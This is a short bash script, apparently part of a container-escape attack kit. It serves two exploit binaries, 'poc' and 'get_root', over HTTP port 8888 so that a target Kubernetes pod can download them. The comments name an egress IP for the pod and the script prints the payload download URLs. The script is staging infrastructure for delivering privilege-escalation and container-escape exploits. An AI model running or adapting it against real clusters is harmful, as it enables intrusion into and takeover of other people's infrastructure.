#!/bin/bash
# Serve exploit binaries for download by the K8s pod
# The pod has internet access via 43.154.29.23
# Run this on a machine reachable from the internet

cd "$(dirname "$0")/nf_escape"

echo "=== Bifrost Container Escape Binary Server ==="
echo "Files being served:"
ls -la poc get_root
echo ""
echo "SHA256 checksums:"
sha256sum poc get_root
echo ""
echo "Starting HTTP server on port 8888..."
echo "Download URLs:"
echo "  http://YOUR_IP:8888/poc"
echo "  http://YOUR_IP:8888/get_root"
echo ""
python3 -m http.server 8888 --bind 0.0.0.0
